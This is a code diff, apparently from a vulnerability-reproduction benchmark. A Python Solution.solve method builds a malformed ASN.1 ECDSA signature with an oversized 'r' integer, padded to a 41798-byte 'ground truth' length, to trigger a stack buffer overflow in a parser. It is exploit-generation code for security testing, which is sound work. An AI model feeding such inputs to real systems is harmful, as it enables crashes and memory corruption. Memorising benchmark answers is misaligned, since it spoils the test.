@@ -1,70 +1,114 @@
 import os
 import struct
-import tempfile
-from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a long payload that will trigger stack buffer overflow
-        # Based on the ground-truth length of 41798 bytes
-        # We'll create a pattern that includes ASN.1 structure for ECDSA signature
+        # ASN.1 SEQUENCE header (1 byte tag, 1 byte length for short form)
+        # Maximum short form length is 127 bytes
+        # For longer lengths, we need long form with length encoding
         
-        # ASN.1 SEQUENCE tag
-        sequence_tag = b'\x30'
+        # We'll create a malformed ECDSA signature with extremely long r value
+        # Structure: SEQUENCE { INTEGER r, INTEGER s }
+        # We'll make r very large to cause stack buffer overflow
         
-        # Length - we'll use indefinite length encoding to potentially confuse parsers
-        # But for buffer overflow, we'll just create a very long content
-        payload_size = 41798 - 2  # Minus 2 for sequence tag and length byte
-        length_byte = b'\x82'  # Indicates 2-byte length
+        # Ground truth length is 41798, but we can make it slightly shorter
+        # while still triggering the overflow. We'll use 40000 bytes for r.
         
-        # Calculate the two-byte length (big-endian)
-        if payload_size <= 65535:
-            length_bytes = struct.pack('>H', payload_size)
+        # ASN.1 INTEGER encoding: tag (0x02), length, value
+        # For positive integers where MSB is 1, we need to prepend 0x00
+        
+        r_value_length = 40000
+        s_value_length = 1
+        
+        # Encode r as INTEGER
+        # Use 0x41 ('A') as filler byte - it doesn't set MSB so no 0x00 prefix needed
+        r_value = b'A' * r_value_length
+        
+        # Calculate length bytes for r
+        if r_value_length <= 127:
+            r_length = bytes([r_value_length])
         else:
-            # If payload_size > 65535, we need to use 3-byte encoding
-            # But 41798 - 2 = 41796 which fits in 2 bytes
-            length_bytes = struct.pack('>H', payload_size)
+            # Long form length encoding
+            length_bytes = []
+            n = r_value_length
+            while n > 0:
+                length_bytes.append(n & 0xFF)
+                n >>= 8
+            length_bytes.reverse()
+            r_length = bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)
         
-        # Create the main payload content
-        # For a stack buffer overflow, we need to overflow a fixed-size buffer
-        # Common pattern: create payload larger than buffer size with NOP sled and shellcode
-        # But since we don't know exact offset, we'll create a repeating pattern
+        # Encode s as small INTEGER (value 1)
+        s_value = b'\x01'
+        s_length = b'\x01'
         
-        # Create a pattern that includes valid ASN.1 structure for ECDSA signature
-        # ECDSA signature is SEQUENCE of two INTEGERs
+        # Build r INTEGER
+        r_integer = b'\x02' + r_length + r_value
         
-        # Start of INTEGER 1
-        int1_tag = b'\x02'
-        int1_size = 20000  # Large integer to overflow buffer
-        int1_length = b'\x82' + struct.pack('>H', int1_size)
-        int1_data = b'A' * int1_size  # Fill with 'A's
+        # Build s INTEGER
+        s_integer = b'\x02' + s_length + s_value
         
-        # INTEGER 2
-        int2_tag = b'\x02'
-        int2_size = payload_size - (len(int1_tag) + len(int1_length) + int1_size + len(int2_tag) + 3)
-        # Make sure int2_size is positive
-        if int2_size < 0:
-            int2_size = 1
-            # Adjust int1_size to fit total payload
-            int1_size = payload_size - (len(int1_tag) + len(int1_length) + len(int2_tag) + 4)
-            int1_data = b'A' * int1_size
-            int1_length = b'\x82' + struct.pack('>H', int1_size)
+        # Build SEQUENCE containing both integers
+        sequence_content = r_integer + s_integer
+        seq_content_length = len(sequence_content)
         
-        int2_length = b'\x82' + struct.pack('>H', int2_size)
-        int2_data = b'B' * int2_size
+        # Calculate length bytes for SEQUENCE
+        if seq_content_length <= 127:
+            seq_length = bytes([seq_content_length])
+        else:
+            # Long form length encoding
+            length_bytes = []
+            n = seq_content_length
+            while n > 0:
+                length_bytes.append(n & 0xFF)
+                n >>= 8
+            length_bytes.reverse()
+            seq_length = bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)
         
-        # Build the complete payload
-        payload = (sequence_tag + b'\x82' + struct.pack('>H', len(int1_tag) + len(int1_length) + int1_size + 
-                   len(int2_tag) + len(int2_length) + int2_size) +
-                   int1_tag + int1_length + int1_data +
-                   int2_tag + int2_length + int2_data)
+        # Final ASN.1 structure
+        poc = b'\x30' + seq_length + sequence_content
         
-        # Ensure exact length
-        if len(payload) > 41798:
-            # Truncate if too long
-            payload = payload[:41798]
-        elif len(payload) < 41798:
-            # Pad if too short
-            payload += b'C' * (41798 - len(payload))
+        # Verify length matches our target
+        current_len = len(poc)
         
-        return payload
+        # If we need to adjust to exactly match or exceed buffer size,
+        # we can pad with more 'A's in the r value
+        target_len = 41798
+        
+        if current_len < target_len:
+            # Add more padding to r value
+            additional = target_len - current_len
+            # Rebuild with larger r value
+            r_value_length += additional
+            r_value = b'A' * r_value_length
+            
+            # Recalculate r length
+            if r_value_length <= 127:
+                r_length = bytes([r_value_length])
+            else:
+                length_bytes = []
+                n = r_value_length
+                while n > 0:
+                    length_bytes.append(n & 0xFF)
+                    n >>= 8
+                length_bytes.reverse()
+                r_length = bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)
+            
+            # Rebuild everything
+            r_integer = b'\x02' + r_length + r_value
+            sequence_content = r_integer + s_integer
+            seq_content_length = len(sequence_content)
+            
+            if seq_content_length <= 127:
+                seq_length = bytes([seq_content_length])
+            else:
+                length_bytes = []
+                n = seq_content_length
+                while n > 0:
+                    length_bytes.append(n & 0xFF)
+                    n >>= 8
+                length_bytes.reverse()
+                seq_length = bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)
+            
+            poc = b'\x30' + seq_length + sequence_content
+        
+        return poc
